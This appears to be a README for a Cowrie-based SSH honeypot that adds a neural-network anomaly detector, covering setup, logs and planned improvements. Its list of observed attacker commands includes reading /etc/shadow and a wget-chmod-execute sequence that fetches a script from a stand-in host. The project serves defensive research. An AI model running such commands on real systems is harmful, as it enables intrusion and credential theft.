🛡️ AI Honeypot (Cowrie-Based SSH Honeypot)

## ⚠️ Important Note

This project requires Cowrie to be installed and running with JSON logging enabled.

If you encounter this error:

Error: The file 'var/log/cowrie/cowrie.json' was not found.

Make sure to enable JSON logging in Cowrie:

[output_jsonlog]
enabled = true
logfile = var/log/cowrie/cowrie.json

A realistic SSH honeypot built using Cowrie, designed to simulate vulnerable systems, capture attacker behavior, and analyze intrusion patterns safely.

📌 Overview

This project sets up a low-interaction SSH honeypot that mimics a Linux system and logs all attacker activity including:

Login attempts
Commands executed
File download attempts
Session behavior

The system is isolated and prevents real damage while providing deep insights into attacker tactics.

## 🤖 AI-Based Anomaly Detection

This project includes a machine learning model (MLP - Neural Network) to analyze attacker behavior.

- Extracts features from honeypot session logs
- Uses a trained neural network (scikit-learn MLP)
- Generates:
  - Anomaly Score
  - Classification (Normal / Suspicious)

### Example Output

IP: 127.0.0.1  
Features: [1, 8, 5.34]  
Anomaly Score: 20.56  
Status: Suspicious

⚙️ Tech Stack
Cowrie Honeypot
Python 3.13
Twisted Framework
Linux Environment
Virtual Environment (venv)
🚀 Setup Instructions
1. Clone Repository
git clone <your-repo-url>
cd ai_honeypot
2. Create Virtual Environment
python3 -m venv cowrie-env
source cowrie-env/bin/activate
3. Install Dependencies
pip install -r requirements.txt
4. Run Cowrie
bin/cowrie start
🔥 Runtime Behavior

When started, the honeypot initializes successfully:

CowrieSSHFactory starting on 2222
Ready to accept SSH connections
Port: 2222
Emulated System: linux-x64-lsb
Output Engine: jsonlog
🔐 Authentication System

Since no custom credential file is configured:

Could not read etc/userdb.txt, default database activated
Example Login Attempts

✅ Successful:

login attempt [root/rooot] succeeded

❌ Failed:

login attempt [root/root] failed

👉 The system intentionally allows weak credentials to simulate vulnerable systems.

🧠 Captured Attacker Behavior

Typical commands observed during sessions:

ls
cd /tmp
pwd
whoami
cat /etc/passwd
cat /etc/shadow
wget http://test.com/file.sh
chmod +x file.sh
./file.sh
🌐 Network Simulation
DNS resolution is simulated:
resolve_cname(test.com)
External access is blocked:
Attempt to access blocked network address

👉 This ensures:

Malware behavior is logged
No real external execution occurs
📂 Logs & Data Storage
Main Logs
var/log/cowrie/cowrie.log
Session Recordings (TTY Logs)
var/lib/cowrie/tty/

Example:

Closing TTY Log: var/lib/cowrie/tty/<session_hash>
🔄 Session Lifecycle

Each attacker session follows:

Connection initiated
SSH handshake (OpenSSH client detected)
Authentication attempt
Fake shell spawned
Commands executed
Session terminated

Example:

Connection lost after 21.2 seconds
🧪 Testing Status

Current observations:

All connections from:
127.0.0.1

👉 Meaning:

System is in local testing phase
Not yet exposed to real-world attackers
⚠️ Known Limitations
No custom credential database (userdb.txt)
No real internet interaction
Only SSH (port 2222) enabled
No monitoring/dashboard integration
🚀 Future Improvements
1. Custom Credentials

Create:

etc/userdb.txt
2. Internet Exposure
Deploy on VPS
Enable port forwarding
Optionally switch to port 22
3. Monitoring & Visualization
ELK Stack (Elasticsearch, Logstash, Kibana)
Custom Python log analyzer
4. Threat Intelligence

Track:

IP addresses
Command patterns
Malware behavior
5. Enhance Realism
Add fake filesystem data
Simulate deeper Linux environment
Improve command responses
🧠 Key Insight

This honeypot is:

✅ Fully functional
✅ Capturing attacker behavior
✅ Safe from real compromise
⚠️ Currently in testing phase
🎯 Goal

To evolve this system into a real-world attacker trap capable of:

Logging real intrusion attempts
Studying attacker psychology
Building cybersecurity intelligence
